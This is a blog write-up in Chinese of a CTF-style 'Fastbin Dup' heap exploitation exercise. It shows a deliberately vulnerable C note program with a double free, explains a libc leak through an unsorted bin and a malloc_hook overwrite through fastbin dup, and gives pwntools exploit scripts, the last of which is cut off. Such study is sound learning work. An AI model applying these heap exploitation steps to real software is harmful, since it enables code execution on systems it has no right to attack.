@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<!--Description-->
+
+
+
+    <meta name="description" content="Pwn-Fastbin Dup 1
+Author: 堇姬Naup
+
+source code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657"/>
+
+
+<!--Author-->
+
+    <meta name="author" content="Naup堇姬"/>
+
+
+<!--Open Graph Title-->
+
+    <meta property="og:title" content="Pwn-Fastbin-Dup-1"/>
+
+
+<!--Open Graph Description-->
+
+    <meta property="og:description" content="Pwn-Fastbin Dup 1
+Author: 堇姬Naup
+
+source code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657"/>
+
+
+<!--Open Graph Site Name-->
+    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>
+
+<!--Type page-->
+
+    <meta property="og:type" content="article"/>
+
+
+<!--Page Cover-->
+
+
+    <meta property="og:image" content="http://example.com/img/bg2.jpg"/>
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+
+
+
+
+    <meta name="twitter:image" content="http://example.com/img/bg2.jpg"/>
+
+
+<!-- Title -->
+
+<title>Pwn-Fastbin-Dup-1 | 堇姬 Naup&#39;s Blog</title>
+
+<!-- Bootstrap Core CSS -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+
+<!-- Custom CSS -->
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<!-- Custom Fonts -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+
+<!-- Gallery -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
+
+<!-- favicon -->
+
+<link rel="icon" href="/img/icon.jpg"/>
+
+
+
+    <!-- Google Analytics -->
+    
+
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+<!-- Head tag -->
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
+    <div class="container pl-0 pr-0">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
+        </div>
+        <div class="navbar-nav float-right">
+            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/bg2.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 text-center">
+                <div class="post-heading text-white">
+                    <h1>Pwn-Fastbin-Dup-1</h1>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                
+                    <span class="meta d-inline-block">
+    
+    
+    <!-- Date -->
+    
+        <span class="post-meta-split">&nbsp;|&nbsp;</span>
+        <i class="far fa-calendar-check fa-fw"></i>
+        2024-07-08
+    
+    <!-- word count and read count -->
+    
+
+    
+
+    
+</span>  
+                
+                <h1 id="Pwn-Fastbin-Dup-1"><a href="#Pwn-Fastbin-Dup-1" class="headerlink" title="Pwn-Fastbin Dup 1"></a>Pwn-Fastbin Dup 1</h1><blockquote>
+<p>Author: 堇姬Naup</p>
+</blockquote>
+<h2 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Testing in libc-2.23</span></span><br><span class="line"><span class="comment">// gcc fastbin_dup.c -o fastbin_dup</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *g_ptrs[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> g_size[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> g_used[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_num</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=== Note System v0.87 ===&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1) Create Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2) Get Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3) Set Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4) Delete Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5) Bye&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;# &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (idx &gt;= <span class="number">0x20</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"></span><br><span class="line">    g_ptrs[idx] = <span class="built_in">malloc</span>(size);</span><br><span class="line">    g_size[idx] = size;</span><br><span class="line">    g_used[idx] = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Create: g_ptrs[%d]\n&quot;</span>, idx);</span><br><span class="line"></span><br><span class="line">    idx++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;idx:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (g_used[idx]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;g_ptrs[%d]: %s\n&quot;</span>, idx, g_ptrs[idx]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;idx:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (g_used[idx]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;str:\n&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, g_ptrs[idx], g_size[idx]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;idx:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (g_ptrs[idx]) &#123;</span><br><span class="line">        <span class="built_in">free</span>(g_ptrs[idx]);</span><br><span class="line">        g_used[idx] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="keyword">switch</span>(read_num()) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            create();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            get();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">set</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            delete();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>可以輸入1~5，分別對應</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=== Note System v0.87 ===&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1) Create Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2) Get Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3) Set Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4) Delete Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5) Bye&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;# &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>create() -&gt; 1</p>
+</blockquote>
+<p>malloc一個chunk，並可以指定一個size</p>
+<p>並且把東西存到這三個global variable</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *g_ptrs[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> g_size[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> g_used[<span class="number">0x20</span>];</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>get() -&gt; 2</p>
+</blockquote>
+<p>先確認該chunk存不存在，以及是否是allocated，你可以指定index，然後給你他的內容</p>
+<blockquote>
+<p>set() -&gt; 3</p>
+</blockquote>
+<p>先確認該chunk存不存在，以及是否是allocated<br>指定index，並可以把內容寫進去chunk裡面</p>
+<blockquote>
+<p>delete -&gt; 4</p>
+</blockquote>
+<p>輸入一個index，若該ptrs存在，則把它free掉，然後把used改成0</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (g_ptrs[idx]) &#123;</span><br><span class="line">    <span class="built_in">free</span>(g_ptrs[idx]);</span><br><span class="line">    g_used[idx] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>觀察一下這裡，他是去找g_ptrs裡面有沒有然後再free掉，但很顯然的g_ptrs就算你free掉了，也不會把它清掉所以就可以double free</p>
+<p>並且打這題目前要有一個先備知識，要怎麼leak libc，我們打算透過fastbin dup來改malloc_hook，那就必須要有libc base，這邊可以用unsorted bin來leak，因為當unsorted bin被free掉時候，fd、bk會指向一個libc address</p>
+<p>像是這樣，我先malloc一個<br><div class="img-item" data-src="https://hackmd.io/_uploads/SJX_vpOv0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJX_vpOv0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>然後free，就可以發現有了<br><div class="img-item" data-src="https://hackmd.io/_uploads/rk_6Pp_PR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rk_6Pp_PR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>接下來我透過在malloc一次一樣大小的來拿到同一塊，並且fd、bk沒有被清空，用get，就可以把它印出來了</p>
+<p>拿offset<br><div class="img-item" data-src="https://hackmd.io/_uploads/SkhSB0uPC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SkhSB0uPC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 0x72db424aab78-0x72db420e6000</span><br><span class="line">3951480</span><br><span class="line">&gt;&gt;&gt; hex(3951480)</span><br><span class="line">&#x27;0x3c4b78&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>目前這樣可以leak libc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG=<span class="built_in">input</span>(<span class="string">&#x27;open debug?(y/n)&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">	<span class="comment">#print(&quot;malloc size: &quot;, size)</span></span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">idx</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	r.recvuntil(<span class="string">b&#x27;]: &#x27;</span>)</span><br><span class="line">	chunk_str=r.recvline().strip()</span><br><span class="line">	<span class="keyword">return</span> chunk_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">index, payload</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">	r.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./fastbindup&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">	gdb.attach(r)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x3c4b78</span></span><br><span class="line">create(<span class="number">0x480</span>) <span class="comment">#unsorted bin</span></span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#delete unsorted bin -&gt; fd,bk -&gt; libc address</span></span><br><span class="line">create(<span class="number">0x480</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(len(get(4)))</span></span><br><span class="line"></span><br><span class="line">leak_libc=u64(get(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base=leak_libc-offset</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ leak libc : &quot;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ libc base : &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>再來就是要寫malloc hook了，這邊先做一件事，我們先到malloc hook去看看<br>我們需要bypass一個安全機制，較chunk size要一樣<br><div class="img-item" data-src="https://hackmd.io/_uploads/SkGTFRuPC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SkGTFRuPC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>觀察一下會發現，他有很多0x7c之類的東西<br>如果能把它當header size(推到header最尾端)就可以bypass</p>
+<p>推一下就可以把他推到後面了(malloc hook - 0x33)<br><div class="img-item" data-src="https://hackmd.io/_uploads/H12yoA_PR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H12yoA_PR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>所以我們應該跳到(malloc hook - 0x23)</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/B11ViCdPA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B11ViCdPA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>跳到<code>libc base + malloc hook offset - 0x23</code><br><div class="img-item" data-src="https://hackmd.io/_uploads/rJ1hs0_PC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rJ1hs0_PC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>bypass</p>
+<p>接下來要做fastbin dup</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk 0 -&gt; 0x440</span><br><span class="line">chunk 1 -&gt; 0x70</span><br><span class="line">chunk 2 -&gt; 0x70</span><br><span class="line">chunk 3 -&gt; 0x70</span><br></pre></td></tr></table></figure>
+
+<p>free 1、2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; chunk 2 -&gt; chunk 1</span><br></pre></td></tr></table></figure>
+
+<p>再free 1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; chunk 1 -&gt; chunk 2 -&gt; chunk 1 -&gt; chunk 2 -&gt; ...</span><br></pre></td></tr></table></figure>
+
+<p>這邊再free 3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; chunk 3 -&gt; chunk 1 -&gt; chunk 2 -&gt; chunk 1 -&gt; chunk 2 -&gt; ...</span><br></pre></td></tr></table></figure>
+
+<p>這邊注意一點，我想把<code>/bin/sh</code>寫進去到heap裡面，所以我要先leak heap的位置，這邊可以挑1 或 2，都沒差，反正到時候都用不到，我這邊挑chunk 1，因為我把chunk 3 free掉後fd指向chunk 1，所以我malloc回來get就可以拿到了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG=<span class="built_in">input</span>(<span class="string">&#x27;open debug?(y/n)&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">	<span class="comment">#print(&quot;malloc size: &quot;, size)</span></span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	<span class="comment">#print(r.recvline())</span></span><br><span class="line"></span><br><span class="line"><span 